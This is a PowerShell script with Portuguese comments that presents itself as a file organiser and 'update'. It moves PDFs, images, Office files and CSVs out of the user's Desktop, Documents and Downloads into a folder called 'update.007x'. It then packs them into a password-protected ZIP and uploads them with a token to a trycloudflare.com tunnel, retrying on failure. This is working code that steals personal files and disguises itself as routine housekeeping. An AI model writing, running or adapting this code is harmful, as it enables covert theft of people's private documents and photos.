 Carrega a biblioteca HTTP necessária no Windows PowerShell 5.1
Add-Type -AssemblyName System.Net.Http

<#
.SYNOPSIS
    Organiza Desktop, Documents e Downloads, cria ZIP com senha e envia pro servidor.

.DESCRIPTION
    Fluxo completo:
      1. Varre Desktop, Documents e Downloads recursivamente
      2. Move arquivos elegíveis para subpasta update.007x
      3. Cria ZIP com senha via 7-Zip (AES-256)
      4. Testa integridade do ZIP antes de enviar
      5. Envia pro servidor via HTTPS multipart/form-data (retry automático)
      6. Gera log detalhado de toda a execução

.NOTES
    Dependência recomendada: 7-Zip (https://www.7-zip.org/)
    PowerShell 5.1+ compatível
#>

#Requires -Version 5.1
Set-StrictMode -Version Latest
$ErrorActionPreference = "SilentlyContinue"

# ================================================================
#  CONFIGURAÇÕES
# ================================================================

$Config = @{
    ExtAlvo       = @(".pdf",".png",".jpg",".jpeg",".gif",".bmp",".webp",".heic",".tiff",".docx",".xlsx",".csv")
    ExtIgnoradas  = @(".exe",".msi",".dmg",".pkg",".app",".deb",".rpm",".appimage",".sh",".bat",".ps1")
    ExtComLimite  = @{ ".zip" = 25 }          # MB
    PastasOrigem  = @(
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Downloads"
    )
    NomePasta     = "update.007x"
    SenhaZip      = "2525"
    ZipPath       = "C:\Program Files\7-Zip\7z.exe"
    ServerUrl     = "https://latex-shut-primarily-kelkoo.trycloudflare.com/upload"  # CORRIGIDO
    Token         = "um-token-longo-e-aleatorio"
    TimeoutSeg    = 120                        # timeout HTTP em segundos
    MaxTentativas = 3                          # tentativas de upload
    DelayRetry    = 5                          # segundos entre tentativas
    LogDir        = "$env:USERPROFILE\Documents\update_logs"
}

# ================================================================
#  SISTEMA DE LOG
# ================================================================

$LogFile = $null

function Init-Log {
    if (-not (Test-Path $Config.LogDir)) {
        New-Item -ItemType Directory -Path $Config.LogDir -Force | Out-Null
    }
    $timestamp  = Get-Date -Format "yyyyMMdd_HHmmss"
    $script:LogFile = Join-Path $Config.LogDir "run_$timestamp.log"
    Write-Log "INFO" "========== NOVA EXECUÇÃO =========="
    Write-Log "INFO" "Script iniciado em: $(Get-Date -Format 'dd/MM/yyyy HH:mm:ss')"
    Write-Log "INFO" "Usuário: $env:USERNAME | Máquina: $env:COMPUTERNAME"
    Write-Log "INFO" "Log salvo em: $script:LogFile"
}

function Write-Log {
    param(
        [ValidateSet("INFO","WARN","ERROR","SUCCESS","DEBUG")]
        [string]$Level,
        [string]$Message
    )

    $ts   = Get-Date -Format "HH:mm:ss"
    $line = "[$ts][$Level] $Message"

    $cor = switch ($Level) {
        "INFO"    { "Cyan" }
        "WARN"    { "Yellow" }
        "ERROR"   { "Red" }
        "SUCCESS" { "Green" }
        "DEBUG"   { "Gray" }
    }
    Write-Host $line -ForegroundColor $cor

    if ($script:LogFile) {
        Add-Content -Path $script:LogFile -Value $line -Encoding UTF8
    }
}

# ================================================================
#  VERIFICAÇÃO DE DEPENDÊNCIAS
# ================================================================

function Test-Dependencias {
    Write-Log "INFO" "Verificando dependências..."

    $script:7ZipDisponivel = Test-Path $Config.ZipPath
    if ($script:7ZipDisponivel) {
        $ver = & $Config.ZipPath i 2>&1 | Select-String "7-Zip" | Select-Object -First 1
        Write-Log "SUCCESS" "7-Zip encontrado: $($ver.ToString().Trim())"
    } else {
        Write-Log "WARN" "7-Zip NÃO encontrado em: $($Config.ZipPath)"
        Write-Log "WARN" "ZIP será criado sem senha (fallback para Compress-Archive)"
    }

    Write-Log "INFO" "Testando conectividade com o servidor..."
    try {
        $host_uri = [System.Uri]$Config.ServerUrl
        $tcp = [System.Net.Sockets.TcpClient]::new()
        $port = if ($host_uri.Port -eq -1) { 443 } else { $host_uri.Port }
        $conn = $tcp.BeginConnect($host_uri.Host, $port, $null, $null)
        $ok   = $conn.AsyncWaitHandle.WaitOne(5000)
        $tcp.Close()
        if ($ok) {
            Write-Log "SUCCESS" "Servidor acessível: $($host_uri.Host):$port"
        } else {
            Write-Log "WARN" "Servidor pode estar inacessível (timeout TCP). Upload tentará mesmo assim."
        }
    } catch {
        Write-Log "WARN" "Não foi possível testar conectividade: $_"
    }
}

# ================================================================
#  ORGANIZAÇÃO DE ARQUIVOS
# ================================================================

function Get-PastaDestino([string]$Origem) {
    $caminho = Join-Path $Origem $Config.NomePasta
    if (-not (Test-Path $caminho)) {
        New-Item -ItemType Directory -Path $caminho -Force | Out-Null
        Write-Log "INFO" "Pasta criada: $caminho"
    }
    return $caminho
}

function Test-DeveMovar([System.IO.FileInfo]$Arquivo) {
    $ext = $Arquivo.Extension.ToLower()

    if ($Config.ExtIgnoradas -contains $ext) { return $false }

    if ($Config.ExtComLimite.ContainsKey($ext)) {
        $tamanhoMB = $Arquivo.Length / 1MB
        return $tamanhoMB -le $Config.ExtComLimite[$ext]
    }

    return $Config.ExtAlvo -contains $ext
}

function Invoke-Organizar([string]$Origem, [string]$Destino) {
    if (-not (Test-Path $Origem)) {
        Write-Log "WARN" "Pasta de origem não encontrada: $Origem"
        return 0
    }

    $movidos   = 0
    $ignorados = 0
    $erros     = 0

    $arquivos = Get-ChildItem -Path $Origem -Recurse -File -ErrorAction SilentlyContinue

    foreach ($item in $arquivos) {
        if ($item.FullName -like "*\$($Config.NomePasta)\*") { continue }

        if (Test-DeveMovar $item) {
            $dest = Join-Path $Destino $item.Name

            $c = 1
            while (Test-Path $dest) {
                $dest = Join-Path $Destino "$($item.BaseName)_$c$($item.Extension)"
                $c++
            }

            try {
                Move-Item -Path $item.FullName -Destination $dest -ErrorAction Stop
                Write-Log "DEBUG" "Movido: $($item.Name) -> $dest"
                $movidos++
            } catch {
                Write-Log "WARN" "Não foi possível mover '$($item.Name)': $_ (arquivo em uso?)"
                $erros++
            }
        } else {
            $ignorados++
        }
    }

    Write-Log "INFO" "Resultado: $movidos movido(s) | $ignorados ignorado(s) | $erros erro(s)"
    return $movidos
}

# ================================================================
#  CRIAÇÃO DO ZIP
# ================================================================

function New-ZipSeguro([string]$Pasta, [string]$Origem) {
    $arquivos = Get-ChildItem -Path $Pasta -Recurse -File -ErrorAction SilentlyContinue
    if ($arquivos.Count -eq 0) {
        Write-Log "INFO" "Nenhum arquivo na pasta, ZIP não criado."
        return $null
    }

    $timestamp = Get-Date -Format "yyyyMMdd_HHmmss"
    $nomeZip   = Join-Path $Origem "update.007x_$timestamp.zip"

    Write-Log "INFO" "Criando ZIP com $($arquivos.Count) arquivo(s)..."

    if ($script:7ZipDisponivel) {
        $saida = & $Config.ZipPath a -tzip "-p$($Config.SenhaZip)" -mem=AES256 "$nomeZip" "$Pasta\*" 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-Log "ERROR" "7-Zip retornou código $LASTEXITCODE. Saída: $saida"
            return $null
        }
        Write-Log "SUCCESS" "ZIP criado com senha (AES-256): $nomeZip"

        Write-Log "INFO" "Testando integridade do ZIP..."
        $teste = & $Config.ZipPath t "-p$($Config.SenhaZip)" "$nomeZip" 2>&1
        if ($LASTEXITCODE -ne 0) {
            Write-Log "ERROR" "ZIP corrompido! Abortando envio. Saída: $teste"
            return $null
        }
        Write-Log "SUCCESS" "Integridade verificada com sucesso."
    } else {
        try {
            Compress-Archive -Path "$Pasta\*" -DestinationPath $nomeZip -Force -ErrorAction Stop
            Write-Log "WARN" "ZIP criado SEM senha (7-Zip ausente): $nomeZip"
        } catch {
            Write-Log "ERROR" "Falha ao criar ZIP: $_"
            return $null
        }
    }

    $tamanhoMB = [math]::Round((Get-Item $nomeZip).Length / 1MB, 2)
    Write-Log "INFO" "Tamanho do ZIP: $tamanhoMB MB"
    return $nomeZip
}

# ================================================================
#  ENVIO PRO SERVIDOR
# ================================================================

function Send-Zip([string]$ZipPath) {
    if (-not (Test-Path $ZipPath)) {
        Write-Log "ERROR" "Arquivo ZIP não encontrado: $ZipPath"
        return $false
    }

    $fileName  = [System.IO.Path]::GetFileName($ZipPath)
    $tamanhoMB = [math]::Round((Get-Item $ZipPath).Length / 1MB, 2)
    Write-Log "INFO" "Iniciando envio: $fileName ($tamanhoMB MB) -> $($Config.ServerUrl)"

    for ($tentativa = 1; $tentativa -le $Config.MaxTentativas; $tentativa++) {
        Write-Log "INFO" "Tentativa $tentativa de $($Config.MaxTentativas)..."

        $client  = $null
        $stream  = $null
        $form    = $null

        try {
            $handler                        = [System.Net.Http.HttpClientHandler]::new()
            $handler.AutomaticDecompression = [System.Net.DecompressionMethods]::GZip -bor [System.Net.DecompressionMethods]::Deflate
            $client                         = [System.Net.Http.HttpClient]::new($handler)
            $client.Timeout                 = [System.TimeSpan]::FromSeconds($Config.TimeoutSeg)
            $client.DefaultRequestHeaders.Add("User-Agent", "update.007x/1.0")
            $client.DefaultRequestHeaders.Add("X-Token", $Config.Token)  # CORRIGIDO

            $form        = [System.Net.Http.MultipartFormDataContent]::new()
            $stream      = [System.IO.File]::OpenRead($ZipPath)
            $fileContent = [System.Net.Http.StreamContent]::new($stream)
            $fileContent.Headers.ContentType = [System.Net.Http.Headers.MediaTypeHeaderValue]::new("application/zip")
            $fileContent.Headers.Add("Content-Length", $stream.Length.ToString())
            $form.Add($fileContent, "file", $fileName)

            $response = $client.PostAsync($Config.ServerUrl, $form).GetAwaiter().GetResult()
            $body     = $response.Content.ReadAsStringAsync().GetAwaiter().GetResult()
            $codigo   = [int]$response.StatusCode

            if ($response.IsSuccessStatusCode) {
                Write-Log "SUCCESS" "Enviado com sucesso! HTTP $codigo | Resposta: $body"
                return $true
            } else {
                Write-Log "WARN" "Servidor retornou HTTP $codigo | Corpo: $body"
            }
        } catch [System.Threading.Tasks.TaskCanceledException] {
            Write-Log "WARN" "Timeout após $($Config.TimeoutSeg)s na tentativa $tentativa."
        } catch {
            Write-Log "WARN" "Erro na tentativa ${tentativa}: $_"
        } finally {
            if ($stream)  { try { $stream.Dispose()  } catch {} }
            if ($form)    { try { $form.Dispose()    } catch {} }
            if ($client)  { try { $client.Dispose()  } catch {} }
        }

        if ($tentativa -lt $Config.MaxTentativas) {
            Write-Log "INFO" "Aguardando $($Config.DelayRetry)s antes da próxima tentativa..."
            Start-Sleep -Seconds $Config.DelayRetry
        }
    }

    Write-Log "ERROR" "Todas as $($Config.MaxTentativas) tentativas falharam para: $fileName"
    return $false
}

# ================================================================
#  EXECUÇÃO PRINCIPAL
# ================================================================

function Main {
    Init-Log
    Test-Dependencias

    $resumo = @{
        PastasProcessadas = 0
        ArquivosMovidos   = 0
        ZipsCriados       = 0
        ZipsEnviados      = 0
        Erros             = 0
    }

    foreach ($origem in $Config.PastasOrigem) {
        Write-Log "INFO" ""
        Write-Log "INFO" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
        Write-Log "INFO" "Processando: $origem"
        Write-Log "INFO" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"

        $destino = Get-PastaDestino $origem
        $movidos = Invoke-Organizar $origem $destino
        $resumo.ArquivosMovidos   += $movidos
        $resumo.PastasProcessadas++

        if ($movidos -gt 0) {
            $zip = New-ZipSeguro $destino $origem

            if ($zip) {
                $resumo.ZipsCriados++
                $ok = Send-Zip $zip
                if ($ok) { $resumo.ZipsEnviados++ } else { $resumo.Erros++ }
            } else {
                $resumo.Erros++
            }
        } else {
            Write-Log "INFO" "Sem arquivos novos, pulando ZIP e envio."
        }
    }

    Write-Log "INFO" ""
    Write-Log "INFO" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
    Write-Log "INFO" "Pastas processadas : $($resumo.PastasProcessadas)"
    Write-Log "INFO" "Arquivos movidos   : $($resumo.ArquivosMovidos)"
    Write-Log "INFO" "ZIPs criados       : $($resumo.ZipsCriados)"
    Write-Log "INFO" "ZIPs enviados      : $($resumo.ZipsEnviados)"
    if ($resumo.Erros -gt 0) {
        Write-Log "WARN" "Erros encontrados  : $($resumo.Erros)"
    } else {
        Write-Log "SUCCESS" "Erros encontrados  : 0"
    }
    Write-Log "INFO" "Log completo salvo : $script:LogFile"
    Write-Log "INFO" "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
}

# ── Ponto de entrada ─────────────────────────────────────────────
Main
